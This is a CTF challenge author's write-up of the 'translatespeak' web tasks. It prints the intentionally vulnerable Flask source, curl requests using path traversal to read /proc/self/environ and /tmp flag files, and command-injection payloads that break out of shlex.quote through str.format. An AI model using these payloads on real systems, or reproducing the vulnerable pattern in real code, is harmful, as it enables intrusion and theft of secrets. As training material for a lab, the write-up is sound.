---
layout:     post
title:      "JHtC4BSK translatespeak [web] writeup"
date:       2017-10-20 23:10:30
tags:       ctf, web, python
---

This is a writeup of translatespeak{1,2,3} web security related tasks I have prepared for [JHtC4BSK CTF](https://bsk.jhtc.pl/) that was held mainly for [MIMUW](https://www.mimuw.edu.pl/) students by JHtC.

By the way, if you want to host and solve those tasks on your own, you can do that using docker-compose by cloning [this repository](https://github.com/JustHitTheCore/JHtC4BSK2017) and running `docker-compose up -d` in the `hosted/translatespeak` directory. This requires Docker and docker-compose to be installed on your machine.

### Challanges descriptions

#### translatespeak1 [WEB 100]

```
Robots are not disallowed if you just need to check some particular endpoints.
http://jhtc4bsk.jhtc.pl:40222/
```

#### translatespeak2 [WEB 200]

```
If you haven't found the source code during translatespeak1, don't start with that.
http://jhtc4bsk.jhtc.pl:40222/
```

#### translatespeak3 [WEB 200]

```
It turned out that translatespeak2 was too easy, so here is the real challenge.
http://jhtc4bsk.jhtc.pl:40222/
```


### --\> SPOILER ALERT - scroll down for solutions \<--
You should really try doing those by yourself! ;)
<br/><br/><br/><br/><br/><br/><br/><br/>
<br/><br/><br/><br/><br/><br/><br/><br/>
<br/><br/><br/><br/><br/><br/><br/><br/>
<br/><br/><br/><br/><br/><br/><br/><br/>

### Solutions

#### Basic info

After we got to the page, we can send a string that will be translated from given (`source`) language to given (`destination`) language.

After submitting translation a synthesized speech sound of the source text is played in english and the sound file can be downloaded by clicking _here_ url:

![translatespeak page after submitting translation](/assets/writeups/jhtc4bsk2017/translatespeak.png){: .center-image }

#### translatespeak2

The task description says `Robots are not disallowed (...)` which suggests a bit to look for robots.txt - [which is a file that is used to give instructions about sites to web robots](http://www.robotstxt.org/robotstxt.html).

So the [http://jhtc4bsk.jhtc.pl:40222/robots.txt](http://jhtc4bsk.jhtc.pl:40222/robots.txt) actually returned a pretty big file which can be seen [here](/assets/writeups/jhtc4bsk2017/translatespeak_robots.txt). There is a lot of endpoints there with different `User-agent` specified.

The idea behind that was to force participants to write a script that would send a GET request to each of those endpoints to find the one that works.
The proper endpoint was `/backup` but the `User-agent` header (that is sent by the browsers so that server can know which browser you used) was crucial as well.

If one didn't send `User-agent` he got a funny `418 I'M A TEAPOT` response code along with redirect to rick roll'd youtube video:

```
curl http://jhtc4bsk.jhtc.pl:40222/backup -v
*   Trying 138.68.97.247...
* TCP_NODELAY set
* Connected to jhtc4bsk.jhtc.pl (138.68.97.247) port 40222 (#0)
> GET /backup HTTP/1.1
> Host: jhtc4bsk.jhtc.pl:40222
> User-Agent: curl/7.55.1
> Accept: */*
> 
< HTTP/1.1 418 I'M A TEAPOT
< Server: gunicorn/19.6.0
< Date: Thu, 19 Oct 2017 16:56:37 GMT
< Connection: close
< Content-Type: text/html; charset=utf-8
< Content-Length: 293
< Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
* Closing connection 0
<p>You should be redirected automatically to target URL: <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">https://www.youtube.com/watch?v=dQw4w9WgXcQ</a>.  If not click the link.
```

But if one sent proper user-agent - `magic` - the one matching for `/backup` in robots.txt - e.g. by such curl request:

```
curl http://jhtc4bsk.jhtc.pl:40222/backup -H User-agent:magic
```

We got such response (NOTE that the code itself starts with `# <!--` and ends with `# --!>` - thanks to that, if the response was rendered in the browser the source code hasn't been displayed as it is between a html comment):

```html
<form action="/translate">
  Translate string:<br>
  <input type="text" name="translate" value=""><br/>
  Source lang:<br>
  <input type="text" name="src" value="pl"><br/>
  Dest lang:<br>
  <input type="text" name="dst" value="en"><br/>
  <input type="submit" value="Submit">
</form>
# <!--
import os
import shlex
import subprocess
import logging
from uuid import uuid4

from flask import Flask, request, redirect
from googletrans import Translator


logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)

flag_1 = os.environ['JHtC4BSK_FIRST_FLAG']

base = """
<form action="/translate">
  Translate string:<br>
  <input type="text" name="translate" value=""><br/>
  Source lang:<br>
  <input type="text" name="src" value="pl"><br/>
  Dest lang:<br>
  <input type="text" name="dst" value="en"><br/>
  <input type="submit" value="Submit">
</form>
"""

hear = """
"""

@app.route('/')
def root():
    return base

TMP_PATH = '/tmp'

@app.route('/translate')
def translate():
    string = request.args.get('translate')
    dst = request.args.get('dst', 'en')
    src = request.args.get('src', 'pl')

    if string:
        string = string[:100]

        tr = Translator().translate(string, dest=dst, src=src)

        fname = os.path.join(TMP_PATH, str(uuid4()))
        try:
            cmd = 'espeak --stdout {}'.format(shlex.quote(string))
            cmd += ' > {0}'
            cmd = cmd.format("'" + fname + "'")
            logging.info('Trying to invoke %s' % cmd)
            subprocess.check_output(cmd, shell=True, env={})
        except Exception as e:
            fname = None
            raise e
        
        render = base + '<br><br>Translated %s to %s' % (tr.origin, tr.text)
        
        if fname:
            render += '<br><br>Download espeak <a href="%s">here</a>' % fname
            render += """
<br>
<script>
var audio = new Audio('%s');
audio.play();
</script>
""" % fname

        return render

    return ''

@app.route(TMP_PATH + '/<filename>')
def tmp(filename):
    if 'flag' in filename:  # /tmp/flag_2, /tmp/flag_3
        return 'lol no'

    with open(os.path.join(TMP_PATH, filename), 'rb') as f:
        return f.read()

# fake server
@app.route('/robots.txt')
def robots():
    return cachedfile(os.path.realpath('robots.txt'))

@app.route('/backup')
def backup():
    if request.headers.get('User-Agent') != 'magic':
        return redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ', code=418)

    filename = request.args.get('fname', os.path.realpath(__file__))

    if 'flag_3' in filename:
        return 'lol no'

    return base + cachedfile(filename)


cache = {}
def cachedfile(fname):
    print("Requesting ", fname)
    if fname not in cache:
        try:
            with open(fname) as f:
                print('Saving file %s in cache' % fname)
                cache[fname] = f.read()
        except FileNotFoundError:
            return '<!-- File not found, sorry --!>'

    return cache[fname]

if __name__ == '__main__':
    app.run(debug=True)

# --!>
```

As we can see one can pass query parameters to the `backup` endpoint and so fetch any file - this is a [path traversal vulnerability](https://www.owasp.org/index.php/Path_Traversal).
There is a suggestion in the code that 2nd and 3rd flags lies in `/tmp` and so flag\_2 can be fetched using this query parameter:

```
$ curl http://jhtc4bsk.jhtc.pl:40222/backup?fname=/tmp/flag_2 -H User-agent:magic

<form action="/translate">
  Translate string:<br>
  <input type="text" name="translate" value=""><br/>
  Source lang:<br>
  <input type="text" name="src" value="pl"><br/>
  Dest lang:<br>
  <input type="text" name="dst" value="en"><br/>
  <input type="submit" value="Submit">
</form>
JHtC4BSK{4w3s0m3_j0b_with_th4t_c0mm4nd_inj3ct1on!}
```

When I created this task, my initial idea was that it should be solved with a command injection but it turned out I forgot to filter flag\_2 from path traversal in the /backup endpoint - that is why we have added flag\_3.

#### translatespeak1

As we could see in the code, the first flag should be located in an environment variable:

```python
flag_1 = os.environ['JHtC4BSK_FIRST_FLAG']
```

We can actually grab it by exploiting path traversal and getting /proc/self/environ file which contains enviroment variables of the current process:

```
$ curl jhtc4bsk.jhtc.pl:40222/backup?fname=/proc/self/environ -H User-agent:magic -o output && cat output
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   565  100   565    0     0    565      0  0:00:01 --:--:--  0:00:01  6726

<form action="/translate">
  Translate string:<br>
  <input type="text" name="translate" value=""><br/>
  Source lang:<br>
  <input type="text" name="src" value="pl"><br/>
  Dest lang:<br>
  <input type="text" name="dst" value="en"><br/>
  <input type="submit" value="Submit">
</form>
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=fdf7471e931dJHtC4BSK_FIRST_FLAG=JHtC4BSK{Gr34t_j0b_mr_r0b0t!}LANG=C.UTF-8GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DPYTHON_VERSION=3.6.3PYTHON_PIP_VERSION=9.0.1HOME=/home/jailed
```

And so we got the flag - `JHtC4BSK{Gr34t_j0b_mr_r0b0t!}`.

#### translatespeak3

The flag\_3 has to be retrieved through a command injection vulnerability which is there in /translate endpoint and the `string` parameter we send to it:

```python
# this is just the interesting parts of the code
    string = request.args.get('translate')

if string:
    string = string[:100]

    fname = os.path.join(TMP_PATH, str(uuid4()))
    try:
        cmd = 'espeak --stdout {}'.format(shlex.quote(string))
        cmd += ' > {0}'
        cmd = cmd.format("'" + fname + "'")
        logging.info('Trying to invoke %s' % cmd)
        subprocess.check_output(cmd, shell=True, env={})
    except Exception as e:
        fname = None
        raise e
```

So it turns out that our string is passed to `shlex.quote` which should give us some safe string that could be passed to shell:

```
In [2]: shlex.quote?
Signature: shlex.quote(s)
Docstring: Return a shell-escaped version of the string *s*.
File:      /usr/lib/python3.6/shlex.py
Type:      function
```

But... then the string is concatenated with `' > {0}'` and a `.format` method is used on it which can be exploited. The point is, one can produce `'` character and go out of the quotation produced by `shlex.quote` by:
- `{0[0]}` which exploits the fact that `'` is already passed to `.format`
- `{0.__doc__[11]}` which is a really interesting and was unintended (unknown for me) way

Some of the solutions:

- `{0[0]} | cat {0[0]}/tmp/flag_3` - this puts the flag directly into the 'sound file' (which isn't a sound file anymore).
- `{0.__doc__[11]}$(cat /tmp/flag_3 | base64 -w 0 > {0}.hehe){0.__doc__[11]}` - this puts the flag into `/tmp/<uuid>.hehe` file which can then be retrieved either by `/backup?fname=...` or `/tmp/...` endpoints.
- `{0[0]} >/dev/null; espeak --stdout $(cat /tmp/flag_2) -a {0[0]}100` - this makes the service read the flag in english, which is a bit bad, as you don't know whether the letters are capital and special characters are not read (underscores and exclamation mark)
- `-f/tmp/flag_2` - does the same as above.

Also, someone had a great idea of checking `-h` and `--help` injections, which just gave out help for espeak :).

And so the flag is `JHtC4BSK{hope_that_this_time_you_really_got_it_with_a_command_injection!}` ;).


### Some random stuff

* The best folk - gorbak - solved all the challenge with just blind command injection - that was awesome.
* I could have removed some of the binaries to make this command injection even harder :P.
* The uploaded files should stay in some unknown path in the filesystem, so people wouldn't be able to just copy flag to /tmp/ and download it.
* Some of the people tried to brute `/tmp/<1-4 character strings>` just to find flag file produced by other participants - this provoked me to add a cronjob which deleted files from /tmp.
* I really should have passed `--` in the espeak command so it would be harder to find out that this is a command injection (if I didn't make that mistake with flag\_2).
* It should have played the sound of translated text instead of the one that is going to be translated, but who cares :D.

